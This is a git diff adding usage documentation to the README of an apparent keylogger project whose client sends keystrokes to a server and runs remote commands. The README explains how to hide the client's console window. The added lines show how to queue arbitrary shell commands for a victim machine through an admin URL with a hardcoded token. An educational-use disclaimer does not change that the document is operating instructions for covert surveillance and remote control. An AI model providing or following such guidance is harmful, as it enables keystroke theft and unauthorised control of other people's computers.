@@ -41,4 +41,18 @@ The client (keylogger) sends keystrokes to the server and polls for remote comma
    ```
 💡 On Windows, you can hide the console by renaming the file to keylogger.pyw and running pythonw keylogger.pyw.
 - The client will print its unique client ID – make a note of it (e.g., a1b2c3d4).
-  
+## 🕹️ Usage – Injecting Commands
+Once the client is running, open your browser and visit the following URL (replace YOUR_ID with the actual client ID):
+```bash
+http://localhost:8000/admin/add?client_id=YOUR_ID&command=whoami&token=secret123
+```
+Wait 10 seconds – the command output will appear in the server terminal.
+You can send any command that works on the target OS:
+ - Windows: ipconfig, dir, whoami
+ - Linux: ifconfig, ls, whoami
+##📜 License
+MIT License – see the LICENSE file for details.
+## ⚠️ Disclaimer
+
+This project is strictly for educational purposes and authorized penetration testing only.
+Do not use it on any system without explicit permission. The author is not responsible for any misuse.
